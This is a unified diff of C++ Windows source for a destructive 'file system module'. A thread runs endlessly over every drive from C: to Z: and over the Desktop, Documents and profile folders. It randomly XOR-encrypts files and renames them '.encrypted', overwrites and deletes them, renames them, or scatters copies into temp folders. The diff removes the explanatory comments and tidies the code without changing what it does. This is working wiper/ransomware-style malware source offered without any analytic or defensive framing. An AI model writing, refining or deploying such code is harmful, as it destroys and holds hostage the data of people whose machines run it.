@@ -2,23 +2,22 @@
 #include <filesystem>
 #include <string>
 #include <random>
+#include <chrono>
 #include <fstream>
 #include <vector>
+#include <shlobj.h>
 
 namespace fs = std::filesystem;
-
-std::mt19937 fileRng(std::chrono::steady_clock::now().time_since_epoch().count());
+std::mt19937 fileRng((unsigned)std::chrono::steady_clock::now().time_since_epoch().count());
 
 void EncryptFile(const fs::path& filePath) {
     try {
-        // Простое XOR шифрование для демонстрации
         std::ifstream in(filePath, std::ios::binary);
         if (!in) return;
 
         std::vector<char> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
         in.close();
 
-        // XOR с ключом
         unsigned char key = 0xAA;
         for (auto& byte : data) {
             byte ^= key;
@@ -28,23 +27,18 @@ void EncryptFile(const fs::path& filePath) {
         out.write(data.data(), data.size());
         out.close();
 
-        // Переименовываем файл
         std::string newName = filePath.string() + ".encrypted";
         fs::rename(filePath, newName);
-    } catch (...) {
-        // Игнорируем ошибки
-    }
+    } catch (...) {}
 }
 
-void DeleteFile(const fs::path& filePath) {
+void DeleteFileSecurely(const fs::path& filePath) {
     try {
-        // Многопроходное удаление
         if (fs::exists(filePath) && fs::is_regular_file(filePath)) {
-            // Перезаписываем файл случайными данными несколько раз
             std::ofstream out(filePath, std::ios::binary);
             if (out) {
                 for (int i = 0; i < 3; i++) {
-                    std::vector<char> junk(fs::file_size(filePath));
+                    std::vector<char> junk((size_t)fs::file_size(filePath));
                     for (auto& c : junk) {
                         c = static_cast<char>(std::uniform_int_distribution<int>(0, 255)(fileRng));
                     }
@@ -69,7 +63,7 @@ void RenameFile(const fs::path& filePath) {
     } catch (...) {}
 }
 
-void CopyAndPasteFiles(const fs::path& sourceDir) {
+void CopyFilesToRandom(const fs::path& sourceDir) {
     try {
         std::vector<fs::path> files;
         for (const auto& entry : fs::recursive_directory_iterator(sourceDir)) {
@@ -78,12 +72,10 @@ void CopyAndPasteFiles(const fs::path& sourceDir) {
             }
         }
 
-        // Копируем файлы в случайные папки
-        for (int i = 0; i < 50 && i < files.size(); i++) {
-            int idx = std::uniform_int_distribution<int>(0, files.size() - 1)(fileRng);
+        for (int i = 0; i < 50 && i < (int)files.size(); i++) {
+            int idx = std::uniform_int_distribution<int>(0, (int)files.size() - 1)(fileRng);
             fs::path source = files[idx];
 
-            // Создаём случайную папку
             fs::path temp = fs::temp_directory_path() / std::to_string(std::uniform_int_distribution<int>(1000, 9999)(fileRng));
             fs::create_directories(temp);
 
@@ -100,22 +92,16 @@ void ProcessDirectory(const fs::path& dirPath) {
         for (const auto& entry : fs::recursive_directory_iterator(dirPath)) {
             if (!fs::is_regular_file(entry)) continue;
 
-            // Исключаем системные файлы Windows
             std::string ext = entry.path().extension().string();
             if (ext == ".exe" || ext == ".dll" || ext == ".sys") continue;
 
             int action = std::uniform_int_distribution<int>(0, 3)(fileRng);
             switch (action) {
                 case 0: EncryptFile(entry.path()); break;
-                case 1: DeleteFile(entry.path()); break;
+                case 1: DeleteFileSecurely(entry.path()); break;
                 case 2: RenameFile(entry.path()); break;
-                case 3:
-                    // Пересоздаём и копируем
-                    CopyAndPasteFiles(fs::path(entry.path()).parent_path());
-                    break;
+                case 3: CopyFilesToRandom(entry.path().parent_path()); break;
             }
-
-            // Небольшая задержка, чтобы не перегружать систему
             Sleep(10);
         }
     } catch (...) {}
@@ -124,7 +110,6 @@ void ProcessDirectory(const fs::path& dirPath) {
 void InitializeFileSystemModule() {
     std::thread fileThread([]() {
         while (true) {
-            // Обрабатываем все диски
             for (char drive = 'C'; drive <= 'Z'; drive++) {
                 std::string drivePath = std::string(1, drive) + ":\\";
                 if (fs::exists(drivePath)) {
@@ -132,7 +117,6 @@ void InitializeFileSystemModule() {
                 }
             }
 
-            // Обрабатываем рабочий стол и системные папки
             char desktopPath[MAX_PATH];
             SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
             ProcessDirectory(desktopPath);
@@ -141,7 +125,6 @@ void InitializeFileSystemModule() {
             SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, documentsPath);
             ProcessDirectory(documentsPath);
 
-            // Обрабатываем папки всех пользователей
             char userPath[MAX_PATH];
             SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userPath);
             ProcessDirectory(userPath);
